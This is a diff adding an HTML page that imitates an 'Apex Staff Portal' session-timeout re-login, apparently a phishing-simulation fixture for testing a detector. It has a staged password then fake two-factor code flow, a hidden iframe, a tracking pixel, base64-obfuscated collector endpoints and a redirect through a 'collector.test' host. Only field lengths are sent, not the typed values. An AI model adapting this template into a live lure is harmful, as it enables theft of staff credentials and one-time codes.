@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to your account</title>
+
+  <!-- External Stylesheet (collector.test) -->
+  <link rel="stylesheet" href="http://collector.test:4174/resource.css" onerror="this.onerror=null;this.href='http://localhost:4174/resource.css';">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: #f1f3f5;
+      color: #212529;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      font-size: 14px;
+      line-height: 1.45;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header-bar {
+      background: #ffffff;
+      border-bottom: 1px solid #dee2e6;
+      padding: 10px 24px;
+    }
+
+    .header-brand {
+      font-size: 16px;
+      font-weight: 700;
+      color: #1e3a8a;
+      letter-spacing: -0.01em;
+    }
+
+    .main-wrap {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+    }
+
+    .login-box {
+      background: #ffffff;
+      border: 1px solid #d1d5db;
+      border-radius: 4px;
+      width: 100%;
+      max-width: 380px;
+      padding: 28px 24px 22px;
+    }
+
+    .session-alert {
+      background: #fff8e6;
+      border-left: 3px solid #d97706;
+      padding: 8px 12px;
+      font-size: 13px;
+      color: #78350f;
+      margin-bottom: 18px;
+    }
+
+    h1 {
+      font-size: 18px;
+      font-weight: 600;
+      color: #111827;
+      margin-bottom: 6px;
+    }
+
+    .sub-msg {
+      font-size: 13px;
+      color: #6b7280;
+      margin-bottom: 18px;
+    }
+
+    .form-row {
+      margin-bottom: 14px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 500;
+      color: #374151;
+      margin-bottom: 4px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 8px 10px;
+      font-size: 14px;
+      border: 1px solid #9ca3af;
+      border-radius: 3px;
+      outline: none;
+      background: #ffffff;
+    }
+
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      border-color: #2563eb;
+      box-shadow: 0 0 0 1px #2563eb;
+    }
+
+    .remember-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 18px;
+      font-size: 12.5px;
+      color: #4b5563;
+    }
+
+    .remember-row label {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin: 0;
+      font-weight: normal;
+      cursor: pointer;
+    }
+
+    .submit-btn {
+      width: 100%;
+      background: #0056b3;
+      color: #ffffff;
+      border: 1px solid #004494;
+      border-radius: 3px;
+      padding: 9px 12px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .submit-btn:hover {
+      background: #004494;
+    }
+
+    .submit-btn:disabled {
+      background: #93c5fd;
+      border-color: #93c5fd;
+      cursor: not-allowed;
+    }
+
+    .links-area {
+      margin-top: 16px;
+      padding-top: 14px;
+      border-top: 1px solid #e5e7eb;
+      font-size: 12px;
+      text-align: center;
+    }
+
+    .links-area a {
+      color: #0056b3;
+      text-decoration: none;
+    }
+
+    .links-area a:hover {
+      text-decoration: underline;
+    }
+
+    .decoy-text {
+      margin-top: 8px;
+      font-size: 11px;
+    }
+
+    .decoy-text a {
+      color: #6b7280;
+    }
+
+    .page-foot {
+      text-align: center;
+      padding: 14px;
+      font-size: 12px;
+      color: #6b7280;
+      border-top: 1px solid #dee2e6;
+      background: #ffffff;
+    }
+
+    .page-foot a {
+      color: #6b7280;
+      text-decoration: none;
+      margin: 0 6px;
+    }
+
+    /* Subtle loading indicator */
+    .loading-state {
+      text-align: center;
+      padding: 20px 0;
+      color: #4b5563;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+
+  <header class="header-bar">
+    <div class="header-brand">Apex Staff Portal</div>
+  </header>
+
+  <main class="main-wrap">
+    <div class="login-box">
+
+      <!-- STAGE 1: Normal Corporate Login Form -->
+      <div id="stage-1">
+        <div class="session-alert">
+          Your session has timed out. Please re-authenticate to continue.
+        </div>
+
+        <h1>Re-authenticate Session</h1>
+        <p class="sub-msg">Sign in with your staff account.</p>
+
+        <!-- Real Semantic Form Detectable by Extension -->
+        <form id="auth-form" method="POST" action="/secure-account-verification/login" autocomplete="on">
+          <div class="form-row">
+            <label for="email">Staff Email</label>
+            <input
+              type="email"
+              id="email"
+              name="email"
+              required
+              autocomplete="username"
+              placeholder="user@apex-corp.net"
+              spellcheck="false"
+            >
+          </div>
+
+          <div class="form-row">
+            <label for="password">Password</label>
+            <input
+              type="password"
+              id="password"
+              name="password"
+              required
+              autocomplete="current-password"
+            >
+          </div>
+
+          <div class="remember-row">
+            <label>
+              <input type="checkbox" id="remember" name="remember" checked>
+              <span>Keep me signed in</span>
+            </label>
+            <a href="http://login.test:4173/account/security/password-assistance?reason=expired" style="color:#0056b3; text-decoration:none;">
+              Need help?
+            </a>
+          </div>
+
+          <button type="submit" id="submit-btn" class="submit-btn">
+            Sign In
+          </button>
+        </form>
+
+        <div class="links-area">
+          <a href="http://login.test:4173/account/security/password-assistance">Forgot password?</a>
+          <div class="decoy-text">
+            <a href="http://login.test:4173/account/security/emergency-token-reset?action=bypass&tenant=corporate">
+              Emergency Access: Session Token Reset
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <!-- STAGE 2: Simple Loading State -->
+      <div id="stage-2" style="display: none;" class="loading-state">
+        <p style="margin-bottom: 8px;">Verifying credentials...</p>
+        <span style="font-size: 12px; color: #9ca3af;">Please wait</span>
+      </div>
+
+      <!-- STAGE 3: Simple Verification Code Step -->
+      <div id="stage-3" style="display: none;"></div>
+
+    </div>
+  </main>
+
+  <footer class="page-foot">
+    &copy; 2026 Apex Enterprises &bull;
+    <a href="/account/security/privacy-notice">Privacy</a> &bull;
+    <a href="/account/security/terms-of-service">Terms</a> &bull;
+    <a href="/account/security/help-desk">Help</a>
+  </footer>
+
+  <!-- Cross-Origin Hidden Iframe (collector.test) - Technical test behavior preserved -->
+  <iframe
+    src="http://collector.test:4174/iframe"
+    style="position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; border: none;"
+    aria-hidden="true"
+    tabindex="-1"
+  ></iframe>
+
+  <!-- Cross-Origin External Tracking Pixel (collector.test) -->
+  <img
+    src="http://collector.test:4174/pixel?session=expired&event=auth_landing_view"
+    width="1"
+    height="1"
+    style="display: none;"
+    alt=""
+    onerror="this.onerror=null;this.src='http://localhost:4174/pixel?session=expired&event=auth_landing_view';"
+  >
+
+  <!-- Cross-Origin External Script (collector.test) -->
+  <script
+    src="http://collector.test:4174/resource.js"
+    onerror="this.onerror=null;const s=document.createElement('script');s.src='http://localhost:4174/resource.js';document.head.appendChild(s);"
+  ></script>
+
+  <script>
+    (function () {
+      'use strict';
+
+      const isTestDomain = window.location.hostname.endsWith('.test');
+      const collectorHost = isTestDomain ? 'collector.test' : 'localhost';
+      const collectorPort = '4174';
+      const sitePort = window.location.port || '4173';
+      const siteHost = window.location.hostname;
+      const collectorOrigin = `http://${collectorHost}:${collectorPort}`;
+      const siteOrigin = `http://${siteHost}:${sitePort}`;
+
+      // Base64 decoded endpoints
+      const _sc = atob('L3Nlc3Npb24tY2hlY2s=');
+      const _te = atob('L3RlbGVtZXRyeQ==');
+
+      // Harmless test cookies
+      document.cookie = 'session_demo=exp_verification_pending; Path=/; SameSite=Lax';
+      document.cookie = 'verification_state=stage_1_pending; Path=/; SameSite=Lax';
+
+      const authForm = document.getElementById('auth-form');
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+      const submitBtn = document.getElementById('submit-btn');
+      const stage1 = document.getElementById('stage-1');
+      const stage2 = document.getElementById('stage-2');
+      const stage3 = document.getElementById('stage-3');
+
+      authForm.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        if ('Notification' in window && Notification.permission === 'default') {
+          try {
+            Notification.requestPermission().catch(() => {});
+          } catch (err) {}
+        }
+
+        // DATA SAFETY: Zero credentials logged or transmitted raw
+        const emailLen = emailInput.value ? emailInput.value.length : 0;
+        const passLen = passwordInput.value ? passwordInput.value.length : 0;
+
+        const telemetryPayload = {
+          site: 'login',
+          event: 'credential_form_submitted',
+          fields: ['email', 'password'],
+          fieldLengths: { email: emailLen, password: passLen },
+          values: '[REDACTED]',
+          timestamp: new Date().toISOString(),
+        };
+
+        emailInput.value = '';
+        passwordInput.value = '';
+        submitBtn.disabled = true;
+
+        stage1.style.display = 'none';
+        stage2.style.display = 'block';
+
+        try {
+          await fetch(`${collectorOrigin}${_sc}`, {
+            method: 'GET',
+            credentials: 'include',
+          }).catch(() => null);
+
+          await fetch(`${collectorOrigin}${_te}?event=login_credential_check`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(telemetryPayload),
+          }).catch(() => null);
+        } catch (err) {}
+
+        document.cookie = 'verification_state=stage_1_verified; Path=/; SameSite=Lax';
+
+        setTimeout(() => {
+          renderStage3();
+        }, 1200);
+      });
+
+      function renderStage3() {
+        stage2.style.display = 'none';
+        stage3.style.display = 'block';
+
+        stage3.innerHTML = `
+          <h2 style="font-size: 16px; font-weight: 600; margin-bottom: 6px;">Two-step verification</h2>
+          <p style="font-size: 13px; color: #6b7280; margin-bottom: 16px;">
+            Enter the 6-digit verification code sent to your mobile device.
+          </p>
+
+          <form id="mfa-form">
+            <div class="form-row">
+              <label for="mfa-code">Security Code</label>
+              <input
+                type="text"
+                id="mfa-code"
+                name="auth_code"
+                style="letter-spacing: 0.3em; font-size: 16px; text-align: center;"
+                maxlength="6"
+                placeholder="000000"
+                autocomplete="one-time-code"
+                required
+                autofocus
+              >
+            </div>
+
+            <button type="submit" id="mfa-submit-btn" class="submit-btn" style="margin-top: 10px;">
+              Verify &amp; Continue
+            </button>
+          </form>
+
+          <div class="links-area" style="margin-top: 14px;">
+            <a href="#" id="resend-code">Didn't get a code?</a>
+          </div>
+        `;
+
+        const mfaForm = document.getElementById('mfa-form');
+        const mfaInput = document.getElementById('mfa-code');
+        const mfaSubmitBtn = document.getElementById('mfa-submit-btn');
+
+        mfaForm.addEventListener('submit', async function (e) {
+          e.preventDefault();
+
+          const codeLength = mfaInput.value ? mfaInput.value.length : 0;
+          mfaInput.value = '';
+
+          const mfaTelemetry = {
+            site: 'login',
+            event: 'mfa_verification_submitted',
+            fields: ['auth_code'],
+            fieldLengths: { auth_code: codeLength },
+            values: '[REDACTED]',
+            timestamp: new Date().toISOString(),
+          };
+
+          mfaSubmitBtn.disabled = true;
+          mfaSubmitBtn.textContent = 'Verifying...';
+
+          document.cookie = 'verification_state=stage_2_completed; Path=/; SameSite=Lax';
+
+          try {
+            await fetch(`${collectorOrigin}${_te}?event=mfa_code_check`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(mfaTelemetry),
+            }).catch(() => null);
+          } catch (err) {}
+
+          const redirectTarget = `${siteOrigin}/complete.html?verified=1`;
+          const redirectUrl = `${collectorOrigin}/redirect?to=${encodeURIComponent(redirectTarget)}`;
+
+          setTimeout(() => {
+            window.location.href = redirectUrl;
+          }, 800);
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
